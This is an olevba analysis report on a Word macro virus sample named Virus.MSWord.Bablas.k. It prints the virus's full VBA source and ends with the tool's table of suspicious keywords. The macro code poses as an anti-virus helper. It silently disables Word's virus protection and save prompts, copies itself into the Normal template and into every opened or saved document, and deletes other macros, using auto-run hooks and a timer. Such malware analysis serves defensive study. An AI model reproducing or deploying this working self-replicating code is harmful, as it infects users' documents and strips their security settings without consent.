olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bablas.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bablas.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AvMacro.bas 
in file: ./Virus.MSWord.Bablas.k - OLE stream: 'Macros/VBA/AvMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PassAway()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub
Sub ToolsMacro()
    OpenMyMacro
End Sub
Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    PassAway
End Sub

Sub OpenMyMacro()
    Msg = "A simple program to protect your" & Chr(13)
    Msg = Msg & "documents from destroying macro viruses" & Chr(13) & Chr(13)
    Msg = Msg & " If you want to edit this program source" & Chr(13)
    Msg = Msg & "call or contact LabCom FT UNS (Mr. Widi)" & Chr(13) & Chr(13) & Chr(13)
    Msg = Msg & "Enter password to edit this program"
    
    If InputBox(Msg, "Av Macro") = "zerg" Then
       Application.ShowVisualBasicEditor = True
    End If
End Sub

Sub SaveDocument()
    Dim DocOk As Boolean
    DocOk = False
    On Error Resume Next
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "AvMacro" Then DocOk = True
        If Obj.Name <> "AvMacro" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Kill " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="AvMacro", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SaveTemplate()
    Dim NorOk As Boolean
    NorOk = False
    On Error Resume Next
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "AvMacro" Then NorOk = True
        If Obj.Name <> "AvMacro" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Kill " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="AvMacro", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    Application.Quit
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SaveDocument
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    PassAway
    SaveTemplate
    On Error Resume Next
    NormalTemplate.Save
End Sub

Sub AutoClose()
    SaveDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        SaveDocument
        SaveTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub KillMacro()
    C = Documents.Count
    If C <> 0 Then
        Normal.AvMacro.SaveDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.AvMacro.KillMacro"
    End If
End Sub

Sub AutoExec()
    Passwrd = False
    WordBasic.DisableAutoMacros True
    PassAway
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.AvMacro.KillMacro"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

